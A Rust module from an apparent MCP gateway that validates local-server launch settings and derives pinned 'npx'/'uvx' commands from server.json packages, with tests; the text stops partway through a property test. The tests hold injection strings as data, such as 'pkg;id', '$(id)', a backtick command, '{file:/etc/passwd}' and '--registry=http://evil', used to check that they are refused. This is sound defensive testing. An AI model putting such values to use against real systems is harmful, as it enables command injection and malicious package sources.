//! Local MCP servers: an MCP server a developer's own machine starts, written
//! into a client config as a command line.
//!
//! What is stored is what is written: a [`LocalLaunch`] — the command, its
//! arguments and its environment. An administrator types it, or adopts a
//! `server.json` package ([`PackageView`], read from one entry of the
//! document's verbatim `packages[]`) and gets it prefilled by [`prefill`]:
//!
//! - an `npm` or `pypi` package over stdio with a pinned version and fixed
//!   arguments derives its command (`npx -y <pkg>@<ver>`, `uvx <pkg>==<ver>`);
//! - any other package derives no command, and [`Underived`] says why — the
//!   administrator types it. Nothing is refused for its registry type.
//!
//! An environment variable is a plain value the administrator set, or has no
//! value and is filled by the developer in their own config file. A secret
//! one never holds a value ([`LaunchError::SecretValue`]), and a variable
//! stored as secret keeps the mark for as long as it exists on the server
//! ([`LocalLaunch::keep_secrets`]): no secret travels through the gateway to a
//! config file by mistake. The mark is a guard against a mistake, not against
//! an administrator, who can type anything into any other field. Developer
//! values live in `env` only — every argument is a fixed string.
//!
//! The derivation writes a third party's document into a command line a
//! developer's machine runs, so it is conservative. The identifier and the
//! version must match a strict charset and never start with `-` (locked by
//! `a_derived_command_never_carries_an_identifier_or_version_outside_its_charset`
//! and `an_identifier_or_version_that_could_read_as_a_flag_derives_nothing`);
//! the command is the registry's own runner, followed by nothing the document
//! chose but the package's own arguments (locked by
//! `only_the_registrys_own_runner_is_a_derived_command` and
//! `a_derived_argv_is_the_runner_its_flags_the_pinned_package_and_its_arguments`);
//! and a fixed value
//! some client would expand (`$VAR`, `{env:X}`, a backtick) derives nothing
//! (locked by `a_value_a_client_would_expand_derives_nothing`). What an
//! administrator types is theirs: only [`LocalLaunch::validate`] applies.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};
use utoipa::ToSchema;

use super::header_inputs::{is_valid_version, Input, InputFormat, KeyValueInput, ServerJson};

/// Longest command, in bytes.
pub const MAX_COMMAND_BYTES: usize = 1024;
/// Most arguments one launch may hold.
pub const MAX_ARGS: usize = 64;
/// Longest argument or environment value, in bytes.
pub const MAX_VALUE_BYTES: usize = 4096;
/// Most environment variables one launch may hold.
pub const MAX_ENV: usize = 32;
/// Most packages a document with no remote may declare.
pub const MAX_PACKAGES: usize = 16;
const MAX_ENV_NAME_BYTES: usize = 128;

fn is_false(b: &bool) -> bool {
    !*b
}

/// One environment variable of a local server.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct LocalEnv {
    pub name: String,
    /// The value the administrator set. Absent: the developer fills it in
    /// their own config file, which is written with a paste-here placeholder.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub value: Option<String>,
    /// A secret (a token, a password): it never holds a value here.
    #[serde(default, skip_serializing_if = "is_false")]
    pub secret: bool,
}

/// How a client starts a local server: what a client config is written with.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct LocalLaunch {
    /// The program: a name found on the developer's `PATH`, or a path.
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: Vec<LocalEnv>,
}

/// Why a launch was refused. Its `Display` is the message the admin API returns.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LaunchError {
    EmptyCommand,
    InvalidCommand,
    TooManyArgs,
    InvalidArg(usize),
    TooManyEnv,
    InvalidEnvName(String),
    DuplicateEnv(String),
    InvalidEnvValue(String),
    /// A secret variable holding a value.
    SecretValue(String),
}

impl std::fmt::Display for LaunchError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::EmptyCommand => f.write_str("the command is empty"),
            Self::InvalidCommand => write!(
                f,
                "the command must be at most {MAX_COMMAND_BYTES} bytes and hold no control or invisible character"
            ),
            Self::TooManyArgs => write!(f, "a local server takes at most {MAX_ARGS} arguments"),
            Self::InvalidArg(i) => write!(
                f,
                "argument {} must be at most {MAX_VALUE_BYTES} bytes and hold no control or invisible character",
                i + 1
            ),
            Self::TooManyEnv => write!(f, "a local server takes at most {MAX_ENV} environment variables"),
            Self::InvalidEnvName(n) => write!(
                f,
                "'{n}' is not an environment variable name (letters, digits and _, not starting with a digit)"
            ),
            Self::DuplicateEnv(n) => write!(f, "environment variable '{n}' is set twice"),
            Self::InvalidEnvValue(n) => write!(
                f,
                "the value of '{n}' must be at most {MAX_VALUE_BYTES} bytes and hold no control or invisible character"
            ),
            Self::SecretValue(n) => write!(
                f,
                "'{n}' is a secret: it cannot hold a value here — each developer sets it in their own config"
            ),
        }
    }
}

impl std::error::Error for LaunchError {}

/// `[A-Za-z_][A-Za-z0-9_]*`, at most 128 bytes.
fn is_env_name(name: &str) -> bool {
    let mut bytes = name.bytes();
    name.len() <= MAX_ENV_NAME_BYTES
        && bytes.next().is_some_and(|b| b.is_ascii_alphabetic() || b == b'_')
        && bytes.all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

/// Every character of the Unicode general categories Cf (format: the
/// zero-width and directional marks, the bidirectional embeddings, overrides
/// and isolates, the soft hyphen, the byte-order mark, the tags, every
/// script's own format controls), Zl and Zp (the line and paragraph
/// separators) — read from the Unicode tables, never listed by hand.
static FORMAT_OR_SEPARATOR: std::sync::LazyLock<regex::Regex> =
    std::sync::LazyLock::new(|| regex::Regex::new(r"[\p{Cf}\p{Zl}\p{Zp}]").expect("a constant character class"));

/// [`FORMAT_OR_SEPARATOR`] less the two joining controls ordinary text is
/// written with: the zero-width joiner (U+200D), which an emoji sequence is
/// built with, and the zero-width non-joiner (U+200C), which Persian, Urdu
/// and the Indic scripts spell words with.
static FORMAT_OR_SEPARATOR_BUT_JOINER: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(r"[[\p{Cf}\p{Zl}\p{Zp}]--[\x{200C}\x{200D}]]").expect("a constant character class")
});

/// The emoji presentation selector (U+FE0F).
const EMOJI_SELECTOR: char = '\u{FE0F}';

/// A character no general category marks as format but a reader cannot see
/// either: the fillers (the Hangul ones U+115F, U+1160, U+3164, U+FFA0, the
/// Khmer inherent vowels U+17B4, U+17B5), the combining grapheme joiner
/// (U+034F), the selectors (Mongolian U+180B–U+180F, the variation selectors
/// U+FE00–U+FE0F), and the blocks reserved for invisible operators
/// (U+2060–U+206F) and for tags and variation selectors (U+E0000–U+E0FFF),
/// their unassigned code points included.
fn is_filler_or_selector(c: char) -> bool {
    matches!(
        c,
        '\u{034F}'
            | '\u{115F}'..='\u{1160}'
            | '\u{17B4}'..='\u{17B5}'
            | '\u{180B}'..='\u{180F}'
            | '\u{2060}'..='\u{206F}'
            | '\u{3164}'
            | '\u{FE00}'..='\u{FE0F}'
            | '\u{FFA0}'
            | '\u{E0000}'..='\u{E0FFF}'
    )
}

/// Text that runs as it reads: no control character, and none a reader
/// cannot see or that reorders what they see. A command an administrator
/// reviews must not differ from what it shows — an emoji's selector or joiner
/// included, since nothing a machine starts needs one.
pub fn is_plain_text(text: &str) -> bool {
    !text.chars().any(|c| c.is_control() || is_filler_or_selector(c)) && !FORMAT_OR_SEPARATOR.is_match(text)
}

/// Text a person reads as it is written — a name a developer picks a server
/// by, a description: [`is_plain_text`], except for the three characters
/// ordinary text is written with — an emoji's presentation selector (U+FE0F)
/// and zero-width joiner (U+200D), and the zero-width non-joiner (U+200C) of
/// Persian, Urdu and Indic words — so such text is not refused.
pub fn is_display_text(text: &str) -> bool {
    !text.chars().any(|c| c.is_control() || (is_filler_or_selector(c) && c != EMOJI_SELECTOR))
        && !FORMAT_OR_SEPARATOR_BUT_JOINER.is_match(text)
}

fn is_plain(value: &str, max: usize) -> bool {
    value.len() <= max && is_plain_text(value)
}

impl LocalLaunch {
    /// Whether this launch can be stored and written into a client config.
    pub fn validate(&self) -> Result<(), LaunchError> {
        if self.command.trim().is_empty() {
            return Err(LaunchError::EmptyCommand);
        }
        if self.command != self.command.trim() || !is_plain(&self.command, MAX_COMMAND_BYTES) {
            return Err(LaunchError::InvalidCommand);
        }
        if self.args.len() > MAX_ARGS {
            return Err(LaunchError::TooManyArgs);
        }
        if let Some(i) = self.args.iter().position(|a| !is_plain(a, MAX_VALUE_BYTES)) {
            return Err(LaunchError::InvalidArg(i));
        }
        if self.env.len() > MAX_ENV {
            return Err(LaunchError::TooManyEnv);
        }
        let mut seen: Vec<&str> = Vec::new();
        for e in &self.env {
            if !is_env_name(&e.name) {
                return Err(LaunchError::InvalidEnvName(e.name.clone()));
            }
            if seen.contains(&e.name.as_str()) {
                return Err(LaunchError::DuplicateEnv(e.name.clone()));
            }
            seen.push(&e.name);
            match &e.value {
                Some(_) if e.secret => return Err(LaunchError::SecretValue(e.name.clone())),
                Some(v) if !is_plain(v, MAX_VALUE_BYTES) => {
                    return Err(LaunchError::InvalidEnvValue(e.name.clone()));
                }
                _ => {}
            }
        }
        Ok(())
    }

    /// Keep the secret mark on every variable that carries it: a variable of
    /// `self`, the launch about to be stored, is marked secret when the launch
    /// it replaces (`stored`) holds a secret variable of that name, or when a
    /// package declares that name secret (`declared`) — whatever the request
    /// said. [`LocalLaunch::validate`], run after this, then refuses a value
    /// for it. The mark lives on the variable: a variable `self` no longer
    /// carries takes its mark with it, and the name added back later is an
    /// ordinary variable.
    pub fn keep_secrets(&mut self, stored: Option<&LocalLaunch>, declared: &[&str]) {
        for env in &mut self.env {
            let stored_secret =
                stored.is_some_and(|s| s.env.iter().any(|e| e.secret && e.name == env.name));
            if stored_secret || declared.contains(&env.name.as_str()) {
                env.secret = true;
            }
        }
    }

    /// The whole launch as a person reads it — the one rendering the API
    /// returns and the CLI prints
    /// ([`streamscope_client_templates::local_command_line`]).
    pub fn command_line(&self) -> String {
        streamscope_client_templates::local_command_line(&self.command, &self.args, &self.env_pairs())
    }

    /// The environment as the template renderer takes it: name → the
    /// administrator's value, `None` for a variable the developer fills.
    pub fn env_pairs(&self) -> Vec<(String, Option<String>)> {
        self.env.iter().map(|e| (e.name.clone(), e.value.clone())).collect()
    }
}

// ── server.json packages ────────────────────────────────────────────────────

/// `Package.transport`, by its type alone.
#[derive(Clone, Debug, Default, PartialEq, Deserialize)]
pub struct PackageTransport {
    #[serde(rename = "type")]
    pub kind: String,
}

/// `server.json` `Argument`: a positional value or a named flag.
#[derive(Clone, Debug, Default, PartialEq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PackageArgument {
    /// `positional` | `named`.
    #[serde(rename = "type")]
    pub kind: String,
    /// The flag, with its dashes (a named argument).
    #[serde(default)]
    pub name: Option<String>,
    #[serde(flatten)]
    pub input: Input,
    #[serde(default)]
    pub variables: BTreeMap<String, Input>,
}

/// One entry of a document's `packages[]`, typed. The document keeps the
/// entry verbatim; this view is parsed from it when the package is the
/// document's only transport, and when it is adopted.
#[derive(Clone, Debug, Default, PartialEq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PackageView {
    pub registry_type: String,
    pub identifier: String,
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub runtime_hint: Option<String>,
    pub transport: PackageTransport,
    #[serde(default)]
    pub runtime_arguments: Vec<PackageArgument>,
    #[serde(default)]
    pub package_arguments: Vec<PackageArgument>,
    #[serde(default)]
    pub environment_variables: Vec<KeyValueInput>,
}

impl ServerJson {
    /// The document's packages, each typed, in document order. An entry that
    /// does not read as a package is `None`: a document with a remote keeps
    /// whatever its `packages` holds, verbatim.
    pub fn package_views(&self) -> Vec<Option<PackageView>> {
        match &self.packages {
            Some(serde_json::Value::Array(items)) => {
                items.iter().map(|p| serde_json::from_value(p.clone()).ok()).collect()
            }
            _ => Vec::new(),
        }
    }
}

/// Why [`prefill`] derived no command from a package.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Underived {
    /// A registry type whose command is not derived (`oci`, `nuget`, `mcpb`, …).
    RegistryType(String),
    /// A transport other than stdio: the package starts a server reached over
    /// HTTP, which a command line alone does not describe.
    Transport(String),
    NoVersion,
    InvalidVersion,
    InvalidIdentifier,
    /// A runtime hint other than the registry's own runner: the document
    /// names the program to run, which only an administrator may choose.
    RuntimeHint(String),
    /// Arguments for the runner itself (`npx -c …`, `uvx --from …`): they
    /// decide what the runner runs, which only an administrator may choose.
    RuntimeArguments,
    /// A positional argument with no fixed value, a secret argument, or one
    /// built from variables.
    Argument(usize),
    /// A fixed argument or environment value holding text some client would
    /// expand when it reads its config (`$VAR`, `{env:X}`, `{file:X}`, a
    /// backtick): what is written would not be what runs.
    Interpolation,
}

impl Underived {
    /// The stable code the admin API returns beside the message.
    pub fn code(&self) -> &'static str {
        match self {
            Self::RegistryType(_) => "registry_type",
            Self::Transport(_) => "transport",
            Self::NoVersion => "no_version",
            Self::InvalidVersion => "invalid_version",
            Self::InvalidIdentifier => "invalid_identifier",
            Self::RuntimeHint(_) => "runtime_hint",
            Self::RuntimeArguments => "runtime_arguments",
            Self::Argument(_) => "argument",
            Self::Interpolation => "interpolation",
        }
    }
}

/// A registry type as a sentence names it, with its article.
fn registry_name(registry_type: &str) -> String {
    match registry_type {
        "oci" => "An OCI".to_string(),
        "nuget" => "A NuGet".to_string(),
        "mcpb" => "An MCPB".to_string(),
        "npm" => "An npm".to_string(),
        "pypi" => "A PyPI".to_string(),
        other => format!("A '{other}'"),
    }
}

impl std::fmt::Display for Underived {
    /// One sentence saying why, and one saying what to do.
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::RegistryType(t) => write!(
                f,
                "{} package has no derived command (only npm and PyPI packages do).",
                registry_name(t)
            )?,
            Self::Transport(t) => write!(f, "The package runs over '{t}', not stdio.")?,
            Self::NoVersion => f.write_str("The package pins no version.")?,
            Self::InvalidVersion => f.write_str("The package's version is not a plain version.")?,
            Self::InvalidIdentifier => f.write_str("The package's identifier is not a plain package name.")?,
            Self::RuntimeHint(_) => f.write_str(
                "The package names its own program to run (a runtime hint other than npx for npm or uvx for PyPI).",
            )?,
            Self::RuntimeArguments => f.write_str(
                "The package passes arguments to the runner itself, which decide what it runs.",
            )?,
            Self::Argument(i) => write!(
                f,
                "Argument {} has no fixed value (it is left to the user, secret, or built from variables).",
                i + 1
            )?,
            Self::Interpolation => f.write_str(
                "A value of the package holds text some clients expand ($VAR, {env:…}, {file:…} or a backtick).",
            )?,
        }
        f.write_str(" Type the command that starts it.")
    }
}

/// What adopting a package starts the local-server form with.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Prefill {
    /// The derived launch. Its `command` is empty and it has no argument when
    /// `underived` is set; its `env` is the package's either way.
    pub launch: LocalLaunch,
    pub underived: Option<Underived>,
}

/// An npm package name: `name` or `@scope/name`, each part starting with a
/// letter or digit and holding only `[A-Za-z0-9._-]`.
fn is_npm_identifier(id: &str) -> bool {
    let part = |p: &str| {
        p.len() <= 214
            && p.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
            && p.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
    };
    match id.strip_prefix('@') {
        Some(scoped) => scoped.split_once('/').is_some_and(|(scope, name)| part(scope) && part(name)),
        None => part(id),
    }
}

/// A PyPI project name: `[A-Za-z0-9._-]`, starting and ending with a letter or
/// digit.
fn is_pypi_identifier(id: &str) -> bool {
    let b = id.as_bytes();
    !b.is_empty()
        && b.len() <= 214
        && b[0].is_ascii_alphanumeric()
        && b[b.len() - 1].is_ascii_alphanumeric()
        && b.iter().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b'-'))
}

/// A pinned version as it is written into a command line: a version string
/// (never a range), starting with a letter or digit, holding only
/// `[A-Za-z0-9._+!-]`.
fn is_plain_version(v: &str) -> bool {
    is_valid_version(v)
        && v.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
        && v.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'+' | b'!' | b'-'))
}

/// Whether some client would expand part of `value` when it reads its config:
/// a `$` (shell-style `$VAR` / `${VAR}`), `{env:` or `{file:` (OpenCode), or a
/// backtick.
fn is_interpolated(value: &str) -> bool {
    value.contains('$') || value.contains('`') || value.contains("{env:") || value.contains("{file:")
}

/// What a package says of one input's value.
enum Fixed {
    /// A value to write as it is.
    Value(String),
    /// None the gateway may write: absent, secret, a file path, a template
    /// over variables, or not text a launch can hold.
    None,
    /// A fixed value some client would expand.
    Interpolated,
}

/// The fixed value of an input: its `value`, else its `default`.
fn fixed_value(input: &Input, variables: &BTreeMap<String, Input>) -> Fixed {
    if input.is_secret || input.format == InputFormat::Filepath {
        return Fixed::None;
    }
    let Some(value) = input.value.as_ref().or(input.default.as_ref()) else {
        return Fixed::None;
    };
    let templated = variables.keys().any(|name| value.contains(&format!("{{{name}}}")));
    if templated || !is_plain(value, MAX_VALUE_BYTES) {
        Fixed::None
    } else if is_interpolated(value) {
        Fixed::Interpolated
    } else {
        Fixed::Value(value.clone())
    }
}

/// Append the command-line tokens of the package's own `arguments` to `out`.
/// A named argument with no value at all is a flag, written alone; a
/// positional one with no fixed value is the user's to give, and derives
/// nothing.
fn push_arguments(out: &mut Vec<String>, arguments: &[PackageArgument]) -> Result<(), Underived> {
    for (i, arg) in arguments.iter().enumerate() {
        let underived = Underived::Argument(i);
        let value = match fixed_value(&arg.input, &arg.variables) {
            Fixed::Value(v) => Some(v),
            Fixed::Interpolated => return Err(Underived::Interpolation),
            Fixed::None => None,
        };
        match arg.kind.as_str() {
            "positional" => out.push(value.ok_or(underived)?),
            "named" => {
                let name = arg.name.as_deref().filter(|n| !n.is_empty() && is_plain(n, MAX_VALUE_BYTES));
                let name = name.ok_or_else(|| underived.clone())?;
                if is_interpolated(name) {
                    return Err(Underived::Interpolation);
                }
                let valueless = arg.input.value.is_none() && arg.input.default.is_none();
                match value {
                    Some(v) => out.extend([name.to_string(), v]),
                    // A flag: no value is declared for it at all.
                    None if valueless && !arg.input.is_secret => out.push(name.to_string()),
                    None => return Err(underived),
                }
            }
            _ => return Err(underived),
        }
    }
    Ok(())
}

/// The package's environment and whether one of its fixed values is text a
/// client would expand. A variable with a fixed, non-secret value keeps it; a
/// REQUIRED one with none is left for the developer; an optional one with
/// none is left out — the server starts without it.
fn package_env(pkg: &PackageView) -> (Vec<LocalEnv>, bool) {
    let mut env: Vec<LocalEnv> = Vec::new();
    let mut interpolated = false;
    for var in &pkg.environment_variables {
        if !is_env_name(&var.name) || env.iter().any(|e| e.name == var.name) || env.len() == MAX_ENV {
            continue;
        }
        let value = match fixed_value(&var.input, &var.variables) {
            Fixed::Value(v) => Some(v),
            Fixed::Interpolated => {
                interpolated = true;
                None
            }
            Fixed::None => None,
        };
        if value.is_none() && !var.input.is_required {
            continue;
        }
        env.push(LocalEnv { name: var.name.clone(), value, secret: var.input.is_secret });
    }
    (env, interpolated)
}

fn derive_command(pkg: &PackageView) -> Result<(String, Vec<String>), Underived> {
    if pkg.transport.kind != "stdio" {
        return Err(Underived::Transport(pkg.transport.kind.clone()));
    }
    // (the registry's runner, its own flags, what joins a package to its pinned version)
    let (runner, runner_flags, pin): (&str, &[&str], &str) = match pkg.registry_type.as_str() {
        "npm" => ("npx", &["-y"], "@"),
        "pypi" => ("uvx", &[], "=="),
        other => return Err(Underived::RegistryType(other.to_string())),
    };
    let version = pkg.version.as_deref().ok_or(Underived::NoVersion)?;
    if !is_plain_version(version) {
        return Err(Underived::InvalidVersion);
    }
    let identifier_ok = match pkg.registry_type.as_str() {
        "npm" => is_npm_identifier(&pkg.identifier),
        _ => is_pypi_identifier(&pkg.identifier),
    };
    if !identifier_ok {
        return Err(Underived::InvalidIdentifier);
    }
    // The command is the registry's runner. A document naming any other
    // program (`sh`, `docker`, a path) names what runs on a developer's
    // machine: that is typed by an administrator, never derived.
    if let Some(hint) = pkg.runtime_hint.as_deref()
        && hint != runner
    {
        return Err(Underived::RuntimeHint(hint.to_string()));
    }
    // Nothing of the document's goes between the runner and the package: an
    // argument for the runner (`-c`, `--from`, `--with`, `--package`) decides
    // what it runs.
    if !pkg.runtime_arguments.is_empty() {
        return Err(Underived::RuntimeArguments);
    }
    let mut args: Vec<String> = runner_flags.iter().map(|f| f.to_string()).collect();
    args.push(format!("{}{pin}{version}", pkg.identifier));
    push_arguments(&mut args, &pkg.package_arguments)?;
    Ok((runner.to_string(), args))
}

/// What the local-server form starts with for a package: the derived command
/// line, or none and the reason, with the package's environment either way.
pub fn prefill(pkg: &PackageView) -> Prefill {
    let (env, env_interpolated) = package_env(pkg);
    let derived = derive_command(pkg).and_then(|d| if env_interpolated { Err(Underived::Interpolation) } else { Ok(d) });
    match derived {
        Ok((command, args)) => Prefill { launch: LocalLaunch { command, args, env }, underived: None },
        Err(why) => Prefill {
            launch: LocalLaunch { command: String::new(), args: Vec::new(), env },
            underived: Some(why),
        },
    }
}

/// The names of the package's secret environment variables: an adopted launch
/// keeps each one secret, so none can be stored with a value.
pub fn secret_env_names(pkg: &PackageView) -> Vec<&str> {
    pkg.environment_variables.iter().filter(|v| v.input.is_secret).map(|v| v.name.as_str()).collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use serde_json::json;

    fn pkg(v: serde_json::Value) -> PackageView {
        serde_json::from_value(v).expect("a package")
    }

    fn launch(command: &str, args: &[&str]) -> LocalLaunch {
        LocalLaunch {
            command: command.into(),
            args: args.iter().map(|a| a.to_string()).collect(),
            ..LocalLaunch::default()
        }
    }

    fn env(name: &str, value: Option<&str>, secret: bool) -> LocalEnv {
        LocalEnv { name: name.into(), value: value.map(str::to_string), secret }
    }

    #[test]
    fn an_npm_and_a_pypi_package_derive_their_runner_and_pinned_spec() {
        // (package, command, args) — one row per registry type and per form of
        // the identifier, the runtime hint and the arguments.
        let cases = [
            (
                json!({"registryType": "npm", "identifier": "@modelcontextprotocol/server-filesystem",
                       "version": "1.0.2", "transport": {"type": "stdio"}}),
                "npx",
                vec!["-y", "@modelcontextprotocol/server-filesystem@1.0.2"],
            ),
            (
                json!({"registryType": "npm", "identifier": "plain-pkg", "version": "2.0.0-beta.1",
                       "runtimeHint": "npx", "transport": {"type": "stdio"},
                       "packageArguments": [{"type": "positional", "value": "mcp"},
                                            {"type": "named", "name": "-t", "default": "stdio"},
                                            {"type": "named", "name": "--verbose"}]}),
                "npx",
                vec!["-y", "plain-pkg@2.0.0-beta.1", "mcp", "-t", "stdio", "--verbose"],
            ),
            (
                json!({"registryType": "pypi", "identifier": "weather-mcp-server", "version": "0.5.0",
                       "runtimeHint": "uvx", "transport": {"type": "stdio"}}),
                "uvx",
                vec!["weather-mcp-server==0.5.0"],
            ),
            (
                json!({"registryType": "pypi", "identifier": "pkg_x", "version": "1!2.0+local",
                       "transport": {"type": "stdio"},
                       "packageArguments": [{"type": "named", "name": "--port", "value": "8080"}]}),
                "uvx",
                vec!["pkg_x==1!2.0+local", "--port", "8080"],
            ),
        ];
        for (doc, command, args) in cases {
            let got = prefill(&pkg(doc.clone()));
            assert_eq!(got.underived, None, "{doc}");
            assert_eq!(got.launch, launch(command, &args), "{doc}");
            got.launch.validate().unwrap();
        }
    }

    #[test]
    fn a_package_that_is_not_derived_says_why_and_keeps_its_environment() {
        let stdio = json!({"type": "stdio"});
        let cases = [
            (json!({"registryType": "oci", "identifier": "docker.io/acme/mcp", "version": "1.0.0", "transport": stdio}),
             Underived::RegistryType("oci".into())),
            (json!({"registryType": "nuget", "identifier": "Acme.Mcp", "version": "1.0.0", "transport": stdio}),
             Underived::RegistryType("nuget".into())),
            (json!({"registryType": "mcpb", "identifier": "https://example.com/a.mcpb", "transport": stdio}),
             Underived::RegistryType("mcpb".into())),
            (json!({"registryType": "npm", "identifier": "pkg", "transport": stdio}), Underived::NoVersion),
            (json!({"registryType": "npm", "identifier": "pkg", "version": "1.0.0",
                    "transport": {"type": "streamable-http", "url": "http://localhost:3000/mcp"}}),
             Underived::Transport("streamable-http".into())),
            // A positional argument left to the user.
            (json!({"registryType": "npm", "identifier": "pkg", "version": "1.0.0", "transport": stdio,
                    "packageArguments": [{"type": "positional", "valueHint": "dir"}]}),
             Underived::Argument(0)),
            // A secret argument, with a value or without one.
            (json!({"registryType": "npm", "identifier": "pkg", "version": "1.0.0", "transport": stdio,
                    "packageArguments": [{"type": "positional", "value": "ok"},
                                         {"type": "named", "name": "--token", "value": "t", "isSecret": true}]}),
             Underived::Argument(1)),
            (json!({"registryType": "npm", "identifier": "pkg", "version": "1.0.0", "transport": stdio,
                    "packageArguments": [{"type": "named", "name": "--token", "isSecret": true}]}),
             Underived::Argument(0)),
            // An argument built from variables.
            (json!({"registryType": "pypi", "identifier": "pkg", "version": "1.0.0", "transport": stdio,
                    "packageArguments": [{"type": "named", "name": "--mount", "value": "src={path}",
                                          "variables": {"path": {"format": "filepath"}}}]}),
             Underived::Argument(0)),
        ];
        for (mut doc, why) in cases {
            doc["environmentVariables"] = json!([{"name": "LOG_LEVEL", "default": "info"}]);
            let got = prefill(&pkg(doc.clone()));
            assert_eq!(got.underived, Some(why), "{doc}");
            assert!(got.launch.command.is_empty() && got.launch.args.is_empty(), "{doc}");
            assert_eq!(got.launch.env, vec![env("LOG_LEVEL", Some("info"), false)], "{doc}");
        }
    }

    /// The command of a derived launch is the registry's runner: a document
    /// naming another program — another runner, a shell, a path — derives
    /// nothing, whatever arguments it brings.
    #[test]
    fn only_the_registrys_own_runner_is_a_derived_command() {
        let doc = |registry: &str, hint: Option<&str>| {
            let mut d = json!({"registryType": registry, "identifier": "pkg", "version": "1.0.0",
                               "transport": {"type": "stdio"},
                               "packageArguments": [{"type": "positional", "value": "-c"}]});
            if let Some(h) = hint {
                d["runtimeHint"] = json!(h);
            }
            prefill(&pkg(d))
        };
        for (registry, runner, other) in [("npm", "npx", "uvx"), ("pypi", "uvx", "npx")] {
            assert_eq!(doc(registry, None).launch.command, runner);
            assert_eq!(doc(registry, Some(runner)).launch.command, runner);
            for hint in [other, "sh", "bash", "docker", "bunx", "pipx", "/usr/bin/npx", "NPX", " npx", "", "npx -c"] {
                let got = doc(registry, Some(hint));
                assert_eq!(got.underived, Some(Underived::RuntimeHint(hint.into())), "{registry} {hint:?}");
                assert!(got.launch.command.is_empty() && got.launch.args.is_empty(), "{registry} {hint:?}");
            }
        }
    }

    /// A fixed value some client would expand when it reads its config derives
    /// nothing, wherever the package puts it; the same package with plain text
    /// there derives its command (the positive control of each row).
    #[test]
    fn a_value_a_client_would_expand_derives_nothing() {
        let with = |member: &str, entry: serde_json::Value| {
            let mut d = json!({"registryType": "npm", "identifier": "pkg", "version": "1.0.0",
                               "transport": {"type": "stdio"}});
            d[member] = json!([entry]);
            prefill(&pkg(d))
        };
        for text in ["$HOME", "${TOKEN}", "a$b", "{env:TOKEN}", "{file:/etc/passwd}", "`id`", "$(id)"] {
            for (member, entry) in [
                ("packageArguments", json!({"type": "positional", "value": text})),
                ("packageArguments", json!({"type": "named", "name": "--x", "default": text})),
                ("packageArguments", json!({"type": "named", "name": text})),
                ("environmentVariables", json!({"name": "V", "value": text})),
                ("environmentVariables", json!({"name": "V", "default": text, "isRequired": true})),
            ] {
                let got = with(member, entry.clone());
                assert_eq!(got.underived, Some(Underived::Interpolation), "{member} {entry}");
                assert!(got.launch.command.is_empty() && got.launch.args.is_empty(), "{member} {entry}");
                assert!(got.launch.env.iter().all(|e| e.value.is_none()), "{member} {entry}");
            }
        }
        for text in ["plain", "{braces}", "a{b}c", "env:TOKEN", "100%", "a=b", "C:\\\\dir"] {
            for (member, entry) in [
                ("packageArguments", json!({"type": "positional", "value": text})),
                ("environmentVariables", json!({"name": "V", "value": text})),
            ] {
                assert_eq!(with(member, entry.clone()).underived, None, "{member} {entry}");
            }
        }
    }

    /// The positive control of the refusals below: the same documents with a
    /// plain identifier and version derive a command.
    #[test]
    fn an_identifier_or_version_that_could_read_as_a_flag_derives_nothing() {
        let doc = |registry: &str, id: &str, ver: &str| {
            pkg(json!({"registryType": registry, "identifier": id, "version": ver, "transport": {"type": "stdio"}}))
        };
        for registry in ["npm", "pypi"] {
            assert_eq!(prefill(&doc(registry, "pkg", "1.0.0")).underived, None);
            for id in ["-rf", "--registry=http://evil", "pkg name", "pkg;id", "pkg$(id)", "", "../pkg", "pkg/../x",
                       "@/x", "@scope/", "@scope/-x", "pkg@1", "pkg==1", "https://example.com/a.tgz"]
            {
                assert_eq!(
                    prefill(&doc(registry, id, "1.0.0")).underived,
                    Some(Underived::InvalidIdentifier),
                    "{registry} {id:?}"
                );
            }
            for ver in ["-1.0", "1.0 --flag", "1.0;id", "^1.0.0", "latest", "1.x", "", "1.0/../x", "1.0@x"] {
                assert_eq!(
                    prefill(&doc(registry, "pkg", ver)).underived,
                    Some(Underived::InvalidVersion),
                    "{registry} {ver:?}"
                );
            }
        }
        // A scope is npm's alone.
        assert_eq!(prefill(&doc("npm", "@scope/pkg", "1.0.0")).underived, None);
        assert_eq!(prefill(&doc("pypi", "@scope/pkg", "1.0.0")).underived, Some(Underived::InvalidIdentifier));
    }

    proptest! {
        /// Whatever a document's identifier, version and runtime hint hold, a
        /// derived command is the registry's runner and carries the package
        /// only as one argument, in the charset, never starting with `-`.
        /// What is NOT claimed: that the package exists, or that a fixed
        /// argument of the document's own (`runtimeArguments`,
        /// `packageArguments`) is harmless — those are shown to the
        /// administrator, who saves the command.
        #[test]
        fn a_derived_command_never_carries_an_identifier_or_version_outside_its_charset(
            registry in prop::sample::select(vec!["npm", "pypi"]),
            id in ".{0,24}",
            ver in ".{0,12}",
            hint in prop::option::of(prop_oneof![Just("npx".to_string()), Just("uvx".to_string()), ".{0,8}"]),
        ) {
            let mut doc = json!({"registryType": registry, "identifier": id, "version": ver,
                                 "transport": {"type": "stdio"}});
            if let Some(h) = &hint {
                doc["runtimeHint"] = json!(h);
            }
            let got = prefill(&pkg(doc));
            if got.underived.is_none() {
